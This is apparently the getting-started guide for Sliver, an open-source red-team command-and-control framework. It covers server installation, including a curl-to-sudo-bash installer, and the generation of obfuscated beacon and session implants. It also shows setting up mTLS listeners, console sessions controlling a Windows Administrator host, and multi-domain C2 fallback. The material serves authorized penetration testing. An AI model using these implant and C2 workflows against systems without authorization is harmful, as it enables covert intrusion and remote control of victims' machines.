Download the latest server [release](https://github.com/BishopFox/sliver/releases) for your platform, and just run the binary. That's it, you're pretty much done.

Sliver is designed for a one server deployment per-operation. The server supports Linux, Windows, and MacOS however we strongly recommend running the server on a Linux host (or MacOS, well really anything that isn't Windows), as some features may be more difficult to get working on a Windows server. The Windows client should work just fine when accessing a Linux/MacOS server from Windows, so if for some odd reason your operators actually want to use Windows you can still accommodate them using [multiplayer mode](/docs?name=Multi-player+Mode).

Obfuscated builds require `git` to be installed. Additionally, Sliver has two external dependencies for _optional_ features: MinGW and Metasploit. To enable DLL payloads (on a Linux server) you need to install MinGW. To enable some MSF integrations you'll need Metasploit installed on the server.

For a Linux server, you can also use the one liner installation `curl https://sliver.sh/install|sudo bash`

```asciinema
{"src": "/asciinema/install-1.cast", "cols": "132"}
```

If you install Sliver via the one liner, you can check that the server service is running using `systemctl status sliver`. Note that the Sliver service is not configured to start automatically on boot by default (i.e., if you reboot the server you'll need to start the service again using `systemctl start sliver`):

```asciinema
{"src": "/asciinema/service-status-1.cast", "cols": "132", "rows": "14", "idleTimeLimit": 8}
```

#### System Requirements

The Sliver server can run effectively on almost any system, however we recommend 8GB or more of RAM for compiling obfuscated implants as the obfuscator may consume large amounts of memory depending on compile-time options. You can leverage [external builders](/docs?name=External+Builders) in conjunction with low resource systems to work around hardware limitations of the server (e.g. a low powered VPS). Symbol obfuscation can also be disabled per-build, see `generate --help` in the Sliver console.

### MinGW Setup (Optional, Recommended)

In order to enable shellcode/staged/DLL payloads you'll need to install MinGW on the server (clients connecting to the server do not need it installed). By default Sliver will look in the usual places for MinGW binaries but you can override this using the [environment variables](/docs?name=Environment+Variables).

#### Linux (Debian-based)

```
apt install git mingw-w64
```

#### MacOS

```
brew install git mingw-w64
```

**Note:** On MacOS you may need to configure [environment variables](/docs?name=Environment+Variables) for MinGW.

See [cross-compiling implants](/docs?name=Cross-compiling+Implants) for more details.

### Metasploit Setup (Optional)

We strongly recommend using the [nightly framework installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers), Sliver expects MSF version 6.2+.

## Implants: Beacon vs. Session

Sliver is generally designed as a stage 2 payload, and as such we've not yet endeavored to minimize the implant's file size. Depending on how many protocols you enable in your implant the file can get large, we strongly advise the use of [stagers](/docs?name=Stagers) for actual operations (at least in contexts where one may be concerned about file size). Such is the tradeoff for getting easy static compilation in Golang.

Sliver implants in v1.5 and later support two modes of operation: "beacon mode" and "session mode." Beacon mode implements an asynchronous communication style where the implant periodically checks in with the server retrieves tasks, executes them, and returns the results. In "session mode" the implant will create an interactive real time session using either a persistent connection or using long polling depending on the underlying C2 protocol.

Beacons may be tasked to open interactive sessions over _any C2 protocol they were compiled with_ using the `interactive` command, i.e., if a beacon implant was not compiled with HTTP C2 it cannot open a session over HTTP (use the `close` command to close the session). Currently implants initially compiled for session mode cannot be converted to beacon mode (we may add this feature later). Take this into account during operational planning.

Some commands such as `shell` and `portfwd` only work over interactive sessions.

## Generating Implants

Generating implants is done using the `generate` command, you must specify at least one C2 endpoint using `--mtls`, `--wg`, `--http`, or `--dns`. Note that when an implant attempts to connect to an endpoint specified using `--http` it will try both HTTPS and then HTTP (if HTTPS fails). We recommend using mTLS (`--mtls`) or WireGuard (`--wg`) whenever possible. You can also specify an output directory with `--save`, by default the implant will be saved to the current working directory.

#### Session Mode

```asciinema
{"src": "/asciinema/sliver-generate-1.cast", "cols": "132"}
```

#### Beacon Mode

```asciinema
{"src": "/asciinema/sliver-generate-2.cast", "cols": "132"}
```

Sliver implants are cross-platform, you can change the compiler target with the `--os` flag. Sliver accepts any Golang GOOS and GOARCH as arguments `--os` and `--arch`, we officially only support Windows, MacOS, and Linux, but you can at least attempt to compile for any other [valid Golang GOOS/GOARCH](https://gist.github.com/asukakenji/f15ba7e588ac42795f421b48b8aede63) combination. The `generate info` command will also estimate what compiler targets can be used based on the server's host operating system and available cross-compilers.

Some commands/features may not work on "unsupported" platforms.

```
sliver > generate --mtls example.com --save /Users/moloch/Desktop --os mac

[*] Generating new darwin/amd64 Sliver binary
[*] Build completed in 00:00:09
[*] Sliver binary saved to: /Users/moloch/Desktop/PROPER_ANTHONY
```

The server will also assign code names to each generated binary i.e. `NEW_GRAPE.exe` you can rename the file to anything you need to, but these code names will still uniquely identify the generated binary (they're inserted at compile-time). You can also view all previously generated implant binaries with the `implants` command:

```
sliver > implants

Name                    OS/Arch        Debug  Format
====                    =======        =====  ======
CAUTIOUS_PANPIPE        darwin/amd64   false  EXECUTABLE
LATE_SUBCOMPONENT       windows/amd64  false  SHARED_LIB
RUBBER_PRINTER          windows/amd64  true   SHARED_LIB
RACIAL_SPECTACLES       darwin/amd64   false  EXECUTABLE
MATHEMATICAL_SASH       darwin/amd64   true   SHARED_LIB
MUSHY_TRADITIONALISM    windows/amd64  false  SHARED_LIB
SICK_SPY                darwin/amd64   false  EXECUTABLE
```

If you need to re-download a previously generated implant use the `regenerate` command, note that positional arguments (the implant name) comes after the command flags (e.g., `--save`):

```
sliver > regenerate --save /Users/moloch/Desktop NEW_GRAPE

[*] Sliver binary saved to: /Users/moloch/Desktop/NEW_GRAPE.exe
```

#### Additional Details

For addition details about each C2 please see:

- [HTTP(S) C2](/docs?name=HTTPS+C2)
- [DNS C2](/docs?name=DNS+C2)

## Getting Shells

Before you can catch the shell, you'll first need to start a listener. You use the commands `mtls`, `http`, `https`, and `dns` to start listeners for each protocol (remember endpoints specified with `--http` can connect to a `https` listener). You can use the `jobs` command to view and manage listeners running in the background. Listeners support both sessions and beacons callbacks:

```
sliver > mtls

[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver > jobs

ID  Name  Protocol  Port
==  ====  ========  ====
1   mTLS  tcp       8888
```

In this example we're using Mutual TLS, the required certificates for setting up and securing this connection have already been generated in the background and the client certificate pair was embedded into the implant at compile-time. So to get a shell you just have to run the binary on the target.

### Interacting with Sessions

The `use` command will tab-complete session and beacon identifiers, but you can also type them out if you really want to (identifier prefixes are accepted). Additionally, running the `use` command with no arguments will enter an interactive menu to select from.

```
[*] Session 8ff2ce4c LONG_DRAMATURGE - [::1]:57154 (MacBook-Pro-6.local) - darwin/amd64 - Thu, 20 Jan 2022 15:45:10 CST

sliver > use 8ff2ce4c

[*] Active session LONG_DRAMATURGE (8ff2ce4c-9c66-4cbc-b33c-2a56196536e6)

sliver (LONG_DRAMATURGE) > ls

/Users/moloch/Desktop
=====================
.DS_Store                 6.0 KiB
.localized                0 B
LONG_DRAMATURGE           6.3 MiB
```

If you're having problems getting callbacks please see our [troubleshooting guide](/docs?name=Troubleshooting), (TL;DR add the `--debug` flag when generating an implant).

### Interacting with Beacons

Upon initial execution the beacon will register itself with the C2 server and will show up under `beacons`, each instance of a beacon process will get its own id and this id is used for the lifetime of that process (i.e., across key renegotiation, etc). The "Next Check-in" value includes any random jitter (by default up to 30s), and you can also watch your beacons in real time using the `beacons watch` command. Remember to leverage tab complete for the uuid when using `use`:

```
[*] Beacon 8c465643 RELATIVE_ADVERTISEMENT - 192.168.1.178:54701 (WIN-1TT1Q345B37) - windows/amd64 - Sat, 22 Jan 2022 14:40:55 CST

[server] sliver > beacons

 ID         Name                     Tasks   Transport   Remote Address        Hostname          Username                        Operating System   Last Check-In    Next Check-In
========== ======================== ======= =========== ===================== ================= =============================== ================== ================ ===============
 8c465643   RELATIVE_ADVERTISEMENT   0/0     mtls        192.168.1.178:54701   WIN-1TT1Q345B37   WIN-1TT1Q345B37\Administrator   windows/amd64      49.385459s ago   37.614549s

[server] sliver > use 8c465643-0e65-45f2-bb7e-acb3480de3cb

[*] Active beacon RELATIVE_ADVERTISEMENT (8c465643-0e65-45f2-bb7e-acb3480de3cb)

[server] sliver (RELATIVE_ADVERTISEMENT) >
```

You should see a blue prompt indicating that we're interacting with a beacon as apposed to a session (red). Commands are executed the same way as a session, though not all commands are supported in beacon mode.

```
[server] sliver (RELATIVE_ADVERTISEMENT) > ls

[*] Tasked beacon RELATIVE_ADVERTISEMENT (962978a6)

[+] RELATIVE_ADVERTISEMENT completed task 962978a6

C:\git
======
drwxrwxrwx  a                           <dir>     Wed Dec 22 15:34:56 -0600 2021
...
```

Tasks will execute in the order they were created (FIFO).

**⚠️ IMPORTANT:** Tasks results will block until all tasks that were part of the same "check-in" have completed. If you have one short running and one long running tasks that are executed as part of the same check-in the short task results will wait for the results of the long running task. Consider executing long running tasks on their own interval. This includes tasks assigned by multiple operators, as the implant is not "aware" of the multiple operators.

You can view previous tasks executed by the active beacon using the `tasks` command:

```
[server] sliver (RELATIVE_ADVERTISEMENT) > tasks

 ID         State       Message Type   Created                         Sent                            Completed
========== =========== ============== =============================== =============================== ===============================
 90294ad2   completed   Ls             Sat, 22 Jan 2022 14:45:00 CST   Sat, 22 Jan 2022 14:45:11 CST   Sat, 22 Jan 2022 14:45:11 CST
 962978a6   completed   Ls             Sat, 22 Jan 2022 14:42:43 CST   Sat, 22 Jan 2022 14:43:53 CST   Sat, 22 Jan 2022 14:43:53 CST
```

You can get the old output from the task using `tasks fetch` and selecting the task you want to see the output from. Operators in multiplayer mode can fetch output from tasks issued by any other operator on the server. However, operators will only see the automatic results from tasks that they themselves executed. You can disable the automatic display of task results using the `settings` command.

#### Switching from Beacon Mode to Session Mode

You can use the `interactive` command to task a beacon to open an interactive session, with no arguments the current C2 channel will be used:

```
[server] sliver (RELATIVE_ADVERTISEMENT) > interactive

[*] Using beacon's active C2 endpoint: mtls://192.168.1.150:8888
[*] Tasked beacon RELATIVE_ADVERTISEMENT (3920e899)

[*] Session 223fac7e RELATIVE_ADVERTISEMENT - 192.168.1.178:54733 (WIN-1TT1Q345B37) - windows/amd64 - Sat, 22 Jan 2022 14:55:24 CST
```

**⚠️ IMPORTANT:** You can only open interactive sessions over C2 protocols that were compiled into the binary. For example, if you did not initially compile an implant with `--http` you won't be able to open an interactive session over HTTP. However, you can specify alternative _endpoints_ (such as a redirector on another domain) using the `interactive` command's flags.

When you're done using the interactive session use the `close` command to close the interactive session without killing the implant; the beacon will still perform check-ins while an interactive session is open.

## Multiple Domains/Protocols

You can specify multiple domains and protocols during the generation process.

By default Sliver will attempt to use the `s` sequential connection strategy: the most performant protocols are used first (MTLS -> WG -> HTTP(S) -> DNS) falling back to subsequent domains/protocols if/when connections fail.

```
sliver > generate --mtls example.com --http foobar.com --dns 1.lil-peep.rip
```

You can modify the connection strategy at compile-time using the `--strategy` flag. For example, you can instruct the implant to `r` randomly connect to any specified C2 endpoint:

```
sliver > generate --mtls foo.com,bar.com,baz.com --strategy r
```

## What Next?

Most commands have a `--help` and support tab complete, you may also find the following wiki articles of interest:

- [Armory](/docs?name=Armory)
- [Stagers](/docs?name=Stagers)
- [Community Guides](/docs?name=Community%20Guides)
- [Port Forwarding](/docs?name=Port%20Forwarding)
- [Reverse SOCKS](/docs?name=Reverse%20SOCKS)
- [BOF/COFF Support](/docs?name=BOF%20and%20COFF%20Support)
